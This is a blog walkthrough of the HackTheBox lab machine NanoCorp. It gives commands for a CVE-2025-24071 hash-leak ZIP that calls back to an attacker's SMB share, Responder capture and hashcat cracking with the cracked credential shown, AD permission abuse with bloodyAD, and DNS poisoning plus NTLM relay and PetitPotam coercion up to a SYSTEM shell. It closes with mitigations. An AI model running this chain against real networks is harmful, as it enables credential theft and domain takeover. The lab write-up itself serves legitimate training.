<!doctype html><html lang=en-us><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=generator content="Qubt theme for Hugo"><title>Hacking Articles</title>
<meta name=title content="Hacking Articles"><meta name=author content="Richie-Havoc"><meta name=description content="Expert ethical hacking tutorials, CTF writeups, and penetration testing guides. Learn cybersecurity through HackTheBox, TryHackMe walkthroughs."><meta name=google-adsense-account content="ca-pub-4834846196060641"><link type=text/css rel=stylesheet href=/css/main.bundle.min.c34ab593f7850b8e7984a77537a338f026bd2efcfe1715fbab66bda06475ab85.css integrity="sha256-w0q1k/eFC455hKd1N6M48Ca9Lvz+FxX7q2a9oGR1q4U="><script defer src=/js/main.bundle.min.5a00293bacd8510f50add105212cea76d541a955f6693035ef3128b638a21619.js integrity="sha256-WgApO6zYUQ9QrdEFISzqdtVBqVX2aTA17zEotjiiFhk="></script><link rel=apple-touch-icon sizes=180x180 href=/icon_hu74b16e164104d2d61e05b7604a924e01_486235_180x180_resize_box_3.png><link rel=icon type=image/png sizes=32x32 href=/icon_hu74b16e164104d2d61e05b7604a924e01_486235_32x32_resize_box_3.png><meta property="og:url" content="https://havocsec.me/pentesting/htb/htb5/"><meta property="og:site_name" content="Hacking Articles"><meta property="og:title" content="HTB NanoCorp "><meta property="og:description" content="A full walkthrough of HTB NanoCorp, covering Windows exploitation, Active Directory abuse, NTLM relay, and privilege escalation techniques."><meta property="og:locale" content="en_us"><meta property="og:type" content="article"><meta property="article:section" content="pentesting"><meta property="article:published_time" content="2025-11-11T00:00:00+00:00"><meta property="article:modified_time" content="2025-12-03T14:00:30+03:00"><meta property="og:image" content="https://havocsec.me/thumbnail.png"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://havocsec.me/thumbnail.png"><meta name=twitter:title content="HTB NanoCorp "><meta name=twitter:description content="A full walkthrough of HTB NanoCorp, covering Windows exploitation, Active Directory abuse, NTLM relay, and privilege escalation techniques."><meta name=description content="Expert ethical hacking tutorials, CTF writeups, and penetration testing guides. Learn cybersecurity through HackTheBox, TryHackMe walkthroughs."><meta name=keywords content="HackTheBox,HTB Writeup,NanoCorp,Windows Exploitation,Active Directory,NTLM Relay,Privilege Escalation,CVE Exploitation,Hard Difficulty,Enumeration,Credential Discovery,Penetration Testing,Windows Security"><meta name=author content="Richie-Havoc"><link rel=canonical href=https://havocsec.me/pentesting/htb/htb5/><meta name=google-site-verification content="5kNQmF94i_v9xe8c753YHZ660ypehgkIpd5I_5VOPL0"><meta name=msvalidate.01 content="FC9BD45C329063D600401FC9551479B8"><meta property="og:type" content="article"><meta property="og:url" content="https://havocsec.me/pentesting/htb/htb5/"><meta property="og:title" content="HTB NanoCorp "><meta property="og:description" content="Expert ethical hacking tutorials, CTF writeups, and penetration testing guides. Learn cybersecurity through HackTheBox, TryHackMe walkthroughs."><meta property="og:image" content><meta property="og:site_name" content="Hacking Articles"><meta property="og:locale" content="en_US"><meta property="article:published_time" content="2025-11-11T00:00:00Z"><meta property="article:modified_time" content="2025-12-03T14:00:30+03:00"><meta property="article:author" content="Richie-Havoc"><meta property="article:tag" content="HackTheBox"><meta property="article:tag" content="HTB Writeup"><meta property="article:tag" content="NanoCorp"><meta property="article:tag" content="Windows Exploitation"><meta property="article:tag" content="Active Directory"><meta property="article:tag" content="NTLM Relay"><meta property="article:tag" content="Privilege Escalation"><meta property="article:tag" content="CVE Exploitation"><meta property="article:tag" content="Hard Difficulty"><meta property="article:tag" content="Enumeration"><meta property="article:tag" content="Credential Discovery"><meta property="article:tag" content="Penetration Testing"><meta property="article:tag" content="Windows Security"><meta name=twitter:card content="summary_large_image"><meta name=twitter:url content="https://havocsec.me/pentesting/htb/htb5/"><meta name=twitter:title content="HTB NanoCorp "><meta name=twitter:description content="Expert ethical hacking tutorials, CTF writeups, and penetration testing guides. Learn cybersecurity through HackTheBox, TryHackMe walkthroughs."><meta name=twitter:image content><meta name=twitter:site content="@HavocRichie?t=smiK1Is6LAWykS9FlJg4eQ&amp;s=09"><meta name=twitter:creator content="@HavocRichie?t=smiK1Is6LAWykS9FlJg4eQ&amp;s=09"><meta name=robots content="index, follow, max-image-preview:large, max-snippet:-1, max-video-preview:-1"><meta name=googlebot content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1"><meta name=bingbot content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1"><meta name=yandex content="index, follow"><meta name=baiduspider content="index, follow"><meta name=language content="English"><meta name=revisit-after content="7 days"><meta name=rating content="General"><meta name=tagline content="Advanced Ethical Hacking & Security Research Platform"><meta name=slogan content="Learn. Hack. Share. Repeat."><meta name=category content="Technology"><meta name=topic content="Cybersecurity, Ethical Hacking, Penetration Testing"><meta name=coverage content="Worldwide"><meta name=distribution content="Global"><meta name=target content="all"><meta name=audience content="Security Researchers, Ethical Hackers, CTF Players, Penetration Testers, Bug Bounty Hunters, Cybersecurity Students"><meta name=geo.region content="US"><meta name=geo.placename content="United States"><meta name=mobile-web-app-capable content="yes"><meta name=apple-mobile-web-app-capable content="yes"><meta name=apple-mobile-web-app-status-bar-style content="black-translucent"><meta name=apple-mobile-web-app-title content="Hacking Articles"><meta name=article:section content="pentesting"><meta name=article:subtitle content="HTB Nanocorp full walkthrough "><meta name=article:summary content="A full walkthrough of HTB NanoCorp, covering Windows exploitation, Active Directory abuse, NTLM relay, and privilege escalation techniques."><meta property="article:publisher" content="https://havocsec.me"><meta name=publisher content="Hacking Articles"><meta name=copyright content="¬© 2025 Hacking Articles. All rights reserved."><meta name=alexaVerifyID content><meta name=norton-safeweb-site-verification content><meta name=thumbnail content><meta itemprop=name content="HTB NanoCorp "><meta itemprop=description content="Expert ethical hacking tutorials, CTF writeups, and penetration testing guides. Learn cybersecurity through HackTheBox, TryHackMe walkthroughs."><meta itemprop=image content><script type=application/ld+json>{"@context":"https://schema.org","@type":"HowTo","name":"HTB NanoCorp ","description":"A full walkthrough of HTB NanoCorp, covering Windows exploitation, Active Directory abuse, NTLM relay, and privilege escalation techniques.","image":"","datePublished":"2025-11-11T00:00:00Z","author":{"@type":"Person","name":"Richie-Havoc"},"publisher":{"@type":"Person","name":"Richie-Havoc"}}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https:\/\/havocsec.me\/"},{"@type":"ListItem","position":2,"name":"Pentesting","item":"https:\/\/havocsec.me\/pentesting/"},{"@type":"ListItem","position":3,"name":"HTB NanoCorp ","item":"https:\/\/havocsec.me\/pentesting\/htb\/htb5\/"}]}</script><script async src="https://www.googletagmanager.com/gtag/js?id=G-M2657LXPFW"></script><script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-M2657LXPFW",{anonymize_ip:!0,send_page_view:!0})</script><meta name=htb-status content="active"><meta name=htb-retire content="2026-03-30"><meta name=htb-machine content="HTB NanoCorp "><script defer src=/js/htb-lock.min.8e60d76f7ed9b9c13cf2e4c3a5c793c6d1c62fe602afb5e4ef6143c03afca885.js integrity="sha256-jmDXb37ZucE88uTDpceTxtHGL+YCr7Xk72FDwDr8qIU="></script><link rel=stylesheet href=/css/htb-lock.min.189e4cc3c0aae97ea28bae651944806deba67932e2f485e2d05d9d4771ff1d07.css integrity="sha256-GJ5Mw8Cq6X6ii65lGUSAbeumeTLi9IXi0F2dR3H/HQc="><script>localStorage.getItem("color-theme")==="dark"||!("color-theme"in localStorage)&&window.matchMedia("(prefers-color-scheme: dark)").matches?document.documentElement.classList.add("dark"):document.documentElement.classList.remove("dark")</script></head><body class="flex h-screen flex-col justify-between bg-neutral-100 dark:bg-neutral-800"><div><header class="sticky top-0 z-10 bg-neutral-100 dark:bg-neutral-800"><section class="mx-auto flex max-w-(--breakpoint-xl) items-center justify-between p-4"><a href=https://havocsec.me/ class="flex items-center space-x-3"><img src=/logo_hu74b16e164104d2d61e05b7604a924e01_486235_filter_7015326143714700434.webp class="h-8 w-8" alt=Logo>
<span class="self-center whitespace-nowrap text-2xl font-semibold text-slate-700 dark:text-slate-400">Hacking Articles</span></a><div class="flex flex-row space-x-8"><nav class="hidden space-x-8 text-xl md:block" aria-label=main><a href=/ class="px-3 py-2 text-slate-700 hover:text-indigo-500 dark:text-slate-400 md:p-0">Home
</a><a href=/about/ class="px-3 py-2 text-slate-700 hover:text-indigo-500 dark:text-slate-400 md:p-0">Whoami
</a><a href=/blog/ class="px-3 py-2 text-slate-700 hover:text-indigo-500 dark:text-slate-400 md:p-0">Blog
</a><a href=/ctf/ class="px-3 py-2 text-slate-700 hover:text-indigo-500 dark:text-slate-400 md:p-0">CTF
</a><a href=/pentesting/ class="px-3 py-2 text-slate-700 hover:text-indigo-500 dark:text-slate-400 md:p-0">Pentesting
</a><a href=/chitchat/ class="px-3 py-2 text-slate-700 hover:text-indigo-500 dark:text-slate-400 md:p-0">Chitchat</a></nav><button id=theme-toggle type=button class="rounded-lg text-sm text-slate-700 hover:text-indigo-500 dark:text-slate-400" aria-label=theme-switcher>
<svg id="theme-toggle-dark-icon" class="hidden h-6 w-6" fill="currentcolor" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><path d="M17.293 13.293A8 8 0 016.707 2.707a8.001 8.001.0 1010.586 10.586z"/></svg>
<svg id="theme-toggle-light-icon" class="hidden h-6 w-6" fill="currentcolor" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><path d="M10 2a1 1 0 011 1v1A1 1 0 119 4V3a1 1 0 011-1zm4 8a4 4 0 11-8 0 4 4 0 018 0zm-.464 4.95.707.707a1 1 0 001.414-1.414l-.707-.707a1 1 0 00-1.414 1.414zm2.12-10.607a1 1 0 010 1.414l-.706.707A1 1 0 1113.536 5.05l.707-.707a1 1 0 011.414.0zM17 11a1 1 0 100-2h-1a1 1 0 100 2h1zm-7 4a1 1 0 011 1v1a1 1 0 11-2 0v-1a1 1 0 011-1zM5.05 6.464A1 1 0 106.465 5.05l-.708-.707A1 1 0 004.343 5.757l.707.707zm1.414 8.486-.707.707a1 1 0 01-1.414-1.414l.707-.707a1 1 0 011.414 1.414zM4 11a1 1 0 100-2H3a1 1 0 000 2h1z" fill-rule="evenodd" clip-rule="evenodd"/></svg>
</button>
<button id=hamburger-button class="relative h-8 w-8 cursor-pointer text-3xl md:hidden" aria-label=hamburger-button><div class="absolute top-4 -mt-0.5 h-[3px] w-8 rounded-sm bg-slate-700 transition-all duration-500 before:absolute before:h-[3px] before:w-8 before:-translate-x-4 before:-translate-y-2.5 before:rounded-sm before:bg-slate-700 before:transition-all before:duration-500 before:content-[''] after:absolute after:h-[3px] after:w-8 after:-translate-x-4 after:translate-y-2.5 after:rounded-sm after:bg-slate-700 after:transition-all after:duration-500 after:content-[''] dark:bg-slate-400 dark:before:bg-slate-400 dark:after:bg-slate-400"></div></button></div></section><section id=mobile-menu class="absolute hidden w-full origin-top animate-open-menu flex-col justify-center bg-neutral-100 text-4xl dark:bg-neutral-800"><nav class="flex min-h-screen flex-col items-center py-8" aria-label=mobile><a href=/ class="px-3 py-2 text-center text-slate-700 hover:text-indigo-500 dark:text-slate-400 md:p-0">Home
</a><a href=/about/ class="px-3 py-2 text-center text-slate-700 hover:text-indigo-500 dark:text-slate-400 md:p-0">Whoami
</a><a href=/blog/ class="px-3 py-2 text-center text-slate-700 hover:text-indigo-500 dark:text-slate-400 md:p-0">Blog
</a><a href=/ctf/ class="px-3 py-2 text-center text-slate-700 hover:text-indigo-500 dark:text-slate-400 md:p-0">CTF
</a><a href=/pentesting/ class="px-3 py-2 text-center text-slate-700 hover:text-indigo-500 dark:text-slate-400 md:p-0">Pentesting
</a><a href=/chitchat/ class="px-3 py-2 text-center text-slate-700 hover:text-indigo-500 dark:text-slate-400 md:p-0">Chitchat</a></nav></section></header><main><div class="justify-left mx-auto mt-8 flex max-w-(--breakpoint-md) px-4"><article><h1 class="text-4xl font-extrabold text-slate-700 dark:text-slate-200">HTB NanoCorp</h1><h2 class="mt-4 text-2xl text-slate-500 dark:text-slate-400">HTB Nanocorp full walkthrough</h2><div class="mb-4 mt-2 text-sm text-slate-500 dark:text-slate-400">Nov 11, 2025 - 7 minute read</div><div class="flex flex-col"><img class="mt-4 h-full w-full object-cover" src=/pwned_hucb48875f0d9fea943b421d26bd54837b_124950_filter_11492400015018413633.webp alt="feature image" height=569 width=736>
<span class="mb-4 mt-1 text-center text-sm text-slate-700 dark:text-slate-200">htb machine</span></div><span class="prose prose-slate break-words text-lg text-slate-700 dark:prose-invert prose-pre:max-w-[90vw] dark:text-slate-200 md:prose-pre:max-w-(--breakpoint-md) prose-code:before:hidden prose-code:after:hidden"><h1 id=-nanocorp--htb-walkthrough>üéØ NANOCORP ‚Äî HTB Walkthrough</h1><p><em>A deep dive into Windows exploitation, Active Directory abuse, and NTLM relay attacks</em></p><aside>üíÄ **Difficulty:** Hard | **OS:** Windows | **Attack Vector:** File Upload ‚Üí AD Privilege Escalation ‚Üí NTLM Relay</aside><h2 id=-machine-profile>üìä Machine Profile</h2><table><thead><tr><th><strong>Machine Name</strong></th><th>Nanocorp</th></tr></thead><tbody><tr><td><strong>Difficulty</strong></td><td>Hard</td></tr><tr><td><strong>Operating System</strong></td><td>Windows Server</td></tr><tr><td><strong>IP Address</strong></td><td>10.10.11.93</td></tr><tr><td><strong>Domain</strong></td><td>nanocorp.htb</td></tr></tbody></table><h2 id=-attack-overview>üéØ Attack Overview</h2><ul><li><strong>Initial Access:</strong> Malicious .library-ms file upload</li><li><strong>Foothold:</strong> NTLMv2 hash capture & cracking</li><li><strong>User:</strong> DACL abuse via BloodHound path</li><li><strong>Root:</strong> DNS poisoning + NTLM relay to SYSTEM</li></ul><hr><p>Recon</p><p>A quick nmap scan on the machine gave this juicy results!!!!!</p><p><img src=images/nmap.png alt=nmap.png></p><ul><li>Port 53 (DNS)
Port 88 (Kerberos)
Port 389/636 (LDAP/LDAPS)
Port 445 (SMB)
Port 5985/5986 (WinRM/WinRMS)</li></ul><h3 id=web>web</h3><p>after adding the machine ip to our etc/hosts file we do some recon and get this subdomain <a href=http://hire.So>**hire.So</a>** We begin at <a href=http://hire.nanocorp.htb/>http://hire.nanocorp.htb</a> .making sure it resolves locally via /etc/hosts. It presents as a corporate career portal: as seen below</p><p><img src=images/hire.png alt=hire.png></p><p>It invites us to upload our r√©sum√© in ZIP format, running on a Windows backend. Classic trapdoor: file upload + archive extraction + Windows = exploitation sweet spot . <a href=http://spot.so></a>so yeah why not do it.</p><h2 id=cve-2025-24071>CVE-2025-24071</h2><p>Windows ZIP traversal exploit for this .NTLMv2 Leak via .library-ms.This exploit weaponizes Windows File Explorer&rsquo;s trust in .library-ms files, triggering a SMB authentication leak during file preview or extraction. It&rsquo;s a spoofing vulnerability that causes NTLMv2 hashes to be sent to an attacker-controlled share via UNC paths,and any ZIP upload feature on a windows server,lets cook it.</p><h3 id=exploiting>exploiting</h3><p>lets crafta <strong>.library-ms</strong> which has **<url>**is <strong>\ATTACKER-IP\share,then</strong></p><p>-Then we place it inside the <strong>ZIp which will lure the victim to extract or preview it</strong></p><p>-when it parse the its hits the unc path then SMB auth to attacker then we capture NTLMv2 hash</p><p>poc (<a href=https://github.com/ThemeHackers/CVE-2025-24071>https://github.com/ThemeHackers/CVE-2025-24071</a>)</p><p>Lets play with terminal a little bit</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>python exploit<span style=color:#f92672>.</span>py <span style=color:#f92672>-</span>f Microsoft <span style=color:#f92672>-</span>i <span style=color:#960050;background-color:#1e0010>$</span>attackerIp
</span></span></code></pre></div><p><img src=images/exploit.py.png alt=exploit.py.png></p><p>This will compress it to a zip folder a cool clickbait to the victim.</p><p>So lets start a responder listener to capture the hash.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>sudo responder <span style=color:#f92672>-</span>i tun0
</span></span></code></pre></div><p>Wooh then we upload the zip to our job application page seen earlier and sit back to capture the flag with our responder listener we set.</p><p><img src=images/uploadzip.png alt=uploadzip.png></p><p><img src=images/hashresponder.png alt=hashresponder.png></p><p>With the NTLMv2 hash we can crack it directly with hashcat mode 5600 (netntlmv2) or John&rsquo;s netntlmv2.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>hashcat <span style=color:#f92672>-</span>m <span style=color:#ae81ff>5600</span> <span style=color:#f92672>-</span>a <span style=color:#ae81ff>0</span> hash<span style=color:#f92672>.</span>txt path<span style=color:#f92672>/</span>to<span style=color:#f92672>/</span>rockyou<span style=color:#f92672>.</span>txt 
</span></span></code></pre></div><p>Normally, a service account isn&rsquo;t crackable ‚Äî its password is often randomized and rotated by the domain controller. But in this case, it looks like we&rsquo;ve hit a weak spot</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>WEB_SVC::NANOCORP:c20b350de63975f6:<span style=color:#ae81ff>9</span>b177a91599ba038441b0515a67cf1ba:<span style=color:#ae81ff>010100000000000080e339</span>d5d150dc01c0e69ed4df847efe0000000002000800500039005a00560001001e00570049004e002d0053004e004700550041004b004c00410039005000300004003400570049004e002d0053004e004700550041004b004c0041003900500030002e00500039005a0056002e004c004f00430041004c0003001400500039005a0056002e004c004f00430041004c0005001400500039005a0056002e004c004f00430041004c000700080080e339d5d150dc010600040002000000080030003000000000000000000000000020000068e2148a7687b11b7a5ee9c7f8432f27119da63a083e40d780efa975583bf8bf0a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310036002e0032000000000000000000:dksehdgh712<span style=color:#960050;background-color:#1e0010>!</span><span style=color:#f92672>@</span><span style=color:#75715e>#</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Session<span style=color:#f92672>..........</span>: hashcat
</span></span><span style=display:flex><span>Status<span style=color:#f92672>...........</span>: Cracked
</span></span><span style=display:flex><span>Hash<span style=color:#f92672>.</span>Mode<span style=color:#f92672>........</span>: <span style=color:#ae81ff>5600</span> (NetNTLMv2)
</span></span><span style=display:flex><span>Hash<span style=color:#f92672>.</span>Target<span style=color:#f92672>......</span>: WEB_SVC::NANOCORP:c20b350de63975f6:<span style=color:#ae81ff>9</span>b177a91599ba038<span style=color:#f92672>..</span><span style=color:#ae81ff>.000000</span>
</span></span></code></pre></div><p>A little here and there we find that NTLM is enabled and thats for sure the greatest news dor this session.
And we now hold a compromised domain service account ‚Äî a golden key that can unlock full domain compromise.</p><h2 id=user-flag>user flag</h2><p>Here we check for for <strong>NTLM reflection</strong> <strong>(CVE-2025-33073)</strong> via the <strong>ntlm_reflection</strong> module,and for sure its vulnerable to it.</p><p>Lets make it useful using coerce primitive. Enter <strong>coerce_plus.</strong></p><p><img src=images/nxc.png alt=nxc.png></p><p>Bloodhoung gave us almost what we need like this graph</p><p><img src=images/graphbloodhound.jpg alt=graphbloodhound.jpg></p><p>briefly:</p><p>-web_svc has AddSelf on group IT_SUPPORT
-IT_SUPPORT has ForceChangePassword on monitoring_svc
-monitoring_svc is in REMOTE_MANAGEMENT</p><h3 id=hijacking-dacl>Hijacking DACL</h3><p>lets hijack monitoring_svc</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>bloodyAD <span style=color:#f92672>--</span>host dc01<span style=color:#f92672>.</span>nanocorp<span style=color:#f92672>.</span>htb <span style=color:#f92672>-</span>d nanocorp<span style=color:#f92672>.</span>htb \
</span></span><span style=display:flex><span>      		<span style=color:#f92672>-</span>u <span style=color:#e6db74>&#39;web_svc&#39;</span> <span style=color:#f92672>-</span>p <span style=color:#e6db74>&#39;dksehdgh712!@#&#39;</span> \
</span></span><span style=display:flex><span>      		add groupMember IT_SUPPORT web_svc
</span></span></code></pre></div><p><img src=images/addingIT.png alt=addingIT.png></p><p>To the password change now</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>bloodyAD <span style=color:#f92672>--</span>host dc01<span style=color:#f92672>.</span>nanocorp<span style=color:#f92672>.</span>htb <span style=color:#f92672>-</span>d nanocorp<span style=color:#f92672>.</span>htb \
</span></span><span style=display:flex><span>      		<span style=color:#f92672>-</span>u <span style=color:#e6db74>&#39;web_svc&#39;</span> <span style=color:#f92672>-</span>p <span style=color:#e6db74>&#39;dksehdgh712!@#&#39;</span> \
</span></span><span style=display:flex><span>      		set password monitoring_svc <span style=color:#e6db74>&#39;Testpass123#&#39;</span>
</span></span></code></pre></div><p><img src=images/changingpass.png alt=changingpass.png></p><p>As usual in kerberos machines clock skew is always a problem</p><p><img src=images/skew-error.png alt=skew-error.png></p><p>so lets sync the clock with the dc one.we use ntpdate and the machine ip to fix this problem.</p><p><img src=images/clockskew.png alt=clockskew.png></p><p>Only WinRMS (WinRM over SSL) is available, so we use evil_winrmexec.py we used this script in onother machine hercules machine.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span> python3 winrmexec<span style=color:#f92672>/</span>evil_winrmexec<span style=color:#f92672>.</span>py <span style=color:#f92672>-</span>ssl <span style=color:#f92672>-</span>port <span style=color:#ae81ff>5986</span> NANOCORP<span style=color:#f92672>.</span>HTB<span style=color:#f92672>/</span>monitoring_svc:<span style=color:#e6db74>&#39;TestPass123@&#39;</span><span style=color:#a6e22e>@dc01.nanocorp.htb</span> <span style=color:#f92672>-</span>k
</span></span></code></pre></div><p><img src=images/shell1.png alt=shell1.png></p><p>And we got the shell lets list the files and find the user flag.(User monitoring_svc compromised)</p><p><img src=images/user.txt.png alt=user.txt.png></p><p>Goal obtain user flag completed ‚Ä¶</p><p>now to the root</p><h2 id=root>Root</h2><h3 id=ntml-relaying-attack>NTML Relaying Attack</h3><p>Since we confirmed the target is vulnerable to NTLM reflection we can try <strong>relay attack through NTLM or escalate into kerberos relaying but for this case we ‚Ä¶.</strong></p><p>Poison the DNS with a marshalled localhost record, set up ntlmrelayx to catch and relay, and finally coerce the authentication via SMB and lemme tell you it was a hit.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>python3 dnstool<span style=color:#f92672>.</span>py <span style=color:#f92672>-</span>u <span style=color:#e6db74>&#39;nanocorp.htb\web_svc&#39;</span> <span style=color:#f92672>-</span>p <span style=color:#e6db74>&#39;dksehdgh712!@#&#39;</span> <span style=color:#ae81ff>10.10.11.93</span> <span style=color:#f92672>-</span>dns<span style=color:#f92672>-</span>ip <span style=color:#ae81ff>10.10.11.93</span> <span style=color:#f92672>-</span>a <span style=color:#e6db74>&#39;add&#39;</span> <span style=color:#f92672>-</span>d <span style=color:#960050;background-color:#1e0010>$</span>attackerIp <span style=color:#f92672>-</span>r <span style=color:#e6db74>&#39;localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA&#39;</span> <span style=color:#f92672>--</span>allow<span style=color:#f92672>-</span>multiple
</span></span></code></pre></div><p>Set up NTLM relay to WinRMS</p><p><img src=images/dnspoisoning.png alt=dnspoisoning.png></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>sudo <span style=color:#f92672>/</span>home<span style=color:#f92672>/</span>havoc<span style=color:#f92672>/</span>venv<span style=color:#f92672>/</span>bin<span style=color:#f92672>/</span>ntlmrelayx<span style=color:#f92672>.</span>py <span style=color:#f92672>-</span>smb2support <span style=color:#f92672>-</span>t winrms:<span style=color:#f92672>//</span><span style=color:#ae81ff>10.10.11.93</span> <span style=color:#f92672>-</span>i
</span></span></code></pre></div><p>Trigger coercion to the poisoned &rsquo;localhost‚Äô</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>nxc smb nanocorp<span style=color:#f92672>.</span>htb <span style=color:#f92672>-</span>u WEB_SVC <span style=color:#f92672>-</span>p <span style=color:#e6db74>&#39;dksehdgh712!@#&#39;</span> <span style=color:#f92672>-</span>M coerce_plus <span style=color:#f92672>-</span>o METHOD<span style=color:#f92672>=</span>Petitpotam LISTENER<span style=color:#f92672>=</span>localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA
</span></span></code></pre></div><p><img src=images/exploit.png alt=exploit.png></p><p>Wooh LEMME tell you we hit it hard and precise‚Ä¶‚Ä¶ so lets nc to <a href=/>localhost</a> and see if NT SYSTEM WinRMS shell is successfully relayed</p><p><img src=images/root.txt.png alt=root.txt.png></p><p>Boom we got the root flag.</p><p>our last goal and mission the root flag we got and pwned the machine.</p><p>Speaking blankly this path is too easy for a hard machine so its surely not the intended way but it did the work .so feel free to explore the other ways to expand the knowledge.</p><p><img src=images/finally.png alt=finally.png></p><hr><aside>üéâ **SYSTEM ACCESS ACHIEVED!**
Root flag: `C:\Users\Administrator\Desktop\root.txt`</aside><hr><h1 id=-lessons-learned>üìö LESSONS LEARNED</h1><h2 id=key-vulnerabilities-exploited>Key Vulnerabilities Exploited</h2><table><thead><tr><th><strong>Vulnerability</strong></th><th><strong>Impact</strong></th><th><strong>Mitigation</strong></th></tr></thead><tbody><tr><td>CVE-2025-24071 (ZIP Traversal)</td><td>NTLMv2 Hash Leak</td><td>Sanitize file uploads, block UNC paths in archives</td></tr><tr><td>Weak Service Account Password</td><td>Initial Domain Access</td><td>Enforce 25+ char randomized passwords</td></tr><tr><td>Excessive DACL Permissions</td><td>Lateral Movement</td><td>Regular AD permission audits</td></tr><tr><td>CVE-2025-33073 (NTLM Reflection)</td><td>Privilege Escalation to SYSTEM</td><td>Disable NTLM, enforce Kerberos-only auth</td></tr></tbody></table><h2 id=-defense-recommendations>üõ°Ô∏è Defense Recommendations</h2><ul><li><strong>Disable NTLM Authentication:</strong> Enforce Kerberos-only authentication across the entire domain to prevent relay attacks</li><li><strong>Implement File Upload Restrictions:</strong> Block archive files or implement deep content inspection to detect UNC paths and malicious library files</li><li><strong>Strengthen Service Accounts:</strong> Use 25+ character machine-generated passwords with automatic rotation policies</li><li><strong>Regular DACL Audits:</strong> Review and remediate excessive Active Directory permissions, especially AddSelf and ForceChangePassword</li><li><strong>DNS Security:</strong> Deploy DNSSEC and restrict dynamic DNS updates to prevent poisoning attacks</li><li><strong>Network Segmentation:</strong> Isolate domain controllers and critical infrastructure from general network access</li><li><strong>WinRM Hardening:</strong> Restrict WinRM to specific management hosts and implement certificate-based authentication</li></ul><h2 id=-technical-skills-demonstrated>üî¨ Technical Skills Demonstrated</h2><h3 id=windows-exploitation>Windows Exploitation</h3><ul><li>ZIP path traversal exploitation</li><li>UNC path injection techniques</li><li>NTLMv2 hash capture & cracking</li><li>Windows library file abuse</li></ul><h3 id=active-directory>Active Directory</h3><ul><li>BloodHound path analysis</li><li>DACL permission abuse</li><li>Kerberos authentication</li><li>Group membership manipulation</li></ul><h3 id=network-attacks>Network Attacks</h3><ul><li>DNS poisoning with marshalled records</li><li>NTLM relay attacks</li><li>SMB authentication coercion</li><li>WinRM over SSL exploitation</li></ul><hr><h1 id=-complete-toolbox>üß∞ COMPLETE TOOLBOX</h1><h2 id=reconnaissance--enumeration>Reconnaissance & Enumeration</h2><table><thead><tr><th><strong>Tool</strong></th><th><strong>Purpose</strong></th><th><strong>Command Example</strong></th></tr></thead><tbody><tr><td>nmap</td><td>Port scanning & service detection</td><td><code>nmap -sC -sV -p- 10.10.11.93</code></td></tr><tr><td>BloodHound</td><td>AD relationship mapping</td><td><code>bloodhound-python -c All</code></td></tr><tr><td>NetExec (nxc)</td><td>SMB enumeration & testing</td><td><code>nxc smb nanocorp.htb -u user -p pass</code></td></tr></tbody></table><h2 id=exploitation--post-exploitation>Exploitation & Post-Exploitation</h2><table><thead><tr><th><strong>Tool</strong></th><th><strong>Purpose</strong></th><th><strong>Command Example</strong></th></tr></thead><tbody><tr><td>Responder</td><td>NTLM hash capture</td><td><code>sudo responder -I tun0 -v</code></td></tr><tr><td>hashcat</td><td>Password cracking</td><td><code>hashcat -m 5600 hash.txt rockyou.txt</code></td></tr><tr><td>bloodyAD</td><td>AD DACL manipulation</td><td><code>bloodyAD add groupMember GROUP USER</code></td></tr><tr><td>dnstool.py</td><td>DNS record manipulation</td><td><code>dnstool.py -a add -r RECORD</code></td></tr><tr><td>ntlmrelayx</td><td>NTLM authentication relay</td><td><code>ntlmrelayx.py -t winrms://target</code></td></tr><tr><td>evil_winrmexec</td><td>WinRM SSL shell access</td><td><code>evil_winrmexec.py -ssl -port 5986</code></td></tr></tbody></table><hr><h1 id=-conclusion>üé¨ CONCLUSION</h1><p><strong>Nanocorp</strong> showcases a realistic Windows domain compromise scenario that combines modern exploitation techniques with classic Active Directory abuse. The attack path from initial file upload to SYSTEM shell demonstrates the importance of defense-in-depth strategies.</p><aside>‚ö†Ô∏è **Critical Takeaway:** This machine proves that even "hard" security barriers can fall when multiple vulnerabilities chain 